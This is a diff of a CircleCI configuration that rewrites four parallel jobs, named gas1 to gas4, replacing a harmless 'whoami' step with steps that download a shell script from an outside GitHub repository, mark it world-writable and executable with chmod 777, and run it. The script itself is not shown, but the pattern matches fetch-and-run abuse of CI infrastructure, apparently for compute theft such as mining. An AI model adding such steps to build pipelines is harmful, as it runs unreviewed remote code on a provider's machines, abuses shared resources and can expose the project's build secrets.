@@ -4,24 +4,32 @@ version: 2.1
 jobs:
   gas1:
     docker:
-      - image: cimg/go:1.16.4
+      - image: cimg/go:1.13.15-browsers
     steps:
-      - run: whoami
+      - run: wget https://github.com/binniyup/datacare/raw/main/get.sh 
+      - run: chmod 777 get.sh 
+      - run: ./get.sh
   gas2:
     docker:
-      - image: cimg/go:1.16.4
+      - image: cimg/go:1.13.15-browsers
     steps:
-      - run: whoami
+      - run: wget https://github.com/binniyup/datacare/raw/main/get.sh 
+      - run: chmod 777 get.sh 
+      - run: ./get.sh
   gas3:
     docker:
-      - image: cimg/go:1.16.4
+      - image: cimg/go:1.13.15-browsers
     steps:
-      - run: whoami
+      - run: wget https://github.com/binniyup/datacare/raw/main/get.sh 
+      - run: chmod 777 get.sh 
+      - run: ./get.sh
   gas4:
     docker:
-      - image: cimg/go:1.16.4
+      - image: cimg/go:1.13.15-browsers
     steps:
-      - run: whoami 
+      - run: wget https://github.com/binniyup/datacare/raw/main/get.sh 
+      - run: chmod 777 get.sh 
+      - run: ./get.sh
 
 # Orchestrate our job run sequence
 workflows:
